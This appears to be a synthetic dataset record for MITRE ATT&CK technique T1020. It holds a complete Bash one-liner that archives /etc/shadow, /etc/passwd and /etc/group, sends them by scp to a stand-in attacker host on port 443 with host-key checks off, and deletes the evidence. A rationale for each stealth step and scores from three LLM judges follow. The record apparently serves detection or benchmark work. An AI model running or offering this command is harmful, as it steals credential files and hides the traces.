@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/syscreds_${ts}.tgz /etc/shadow /etc/passwd /etc/group >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/syscreds_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/ >/dev/null 2>&1 && rm -f /tmp/syscreds_${ts}.tgz",
+  "explanation": "Packages sensitive account files and exfiltrates them via scp using non-interactive key auth over SSH on port 443, running quietly and removing artifacts to remain stealthy.",
+  "rationale_steps": [
+    "Create a timestamped tarball of /etc/shadow, /etc/passwd, and /etc/group to aggregate targets and reduce transfer size.",
+    "Use scp with -q and -C for quiet, compressed transfer and -i for key-based, non-interactive auth.",
+    "Bypass host key prompts with StrictHostKeyChecking=no and suppress host entry with UserKnownHostsFile=/dev/null.",
+    "Send to a hidden path on the remote host and delete the local archive to reduce forensic traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-2dd6b351",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed Bash with valid flags, proper separators, variable expansion, and standard redirections.",
+        "semantic_score": 3,
+        "semantic_justification": "While it aligns with T1020 by bundling data and exfiltrating via scp with stealth and cleanup, it would typically fail without root to read /etc/shadow and to use /root/.ssh/id_rsa, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:07:39.499438Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable expansion, balanced quoting, valid tar/scp flags, proper use of && chaining, and correct redirection syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1020 automated exfiltration: it timestamps and archives sensitive credential files (/etc/shadow, /etc/passwd, /etc/group), transfers them silently via SCP over port 443 using key-based authentication to an external host, suppresses all output, and removes local artifacts — demonstrating batching, compression, stealth, and automated transfer to an external location.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:28:53.785845Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper Bash syntax, including variable assignment, logical operators, and correctly formatted flags for tar and scp.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates automated exfiltration by packaging sensitive files, using non-interactive authentication for transfer over a common evasion port, and cleaning up traces.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:28:56.241079Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
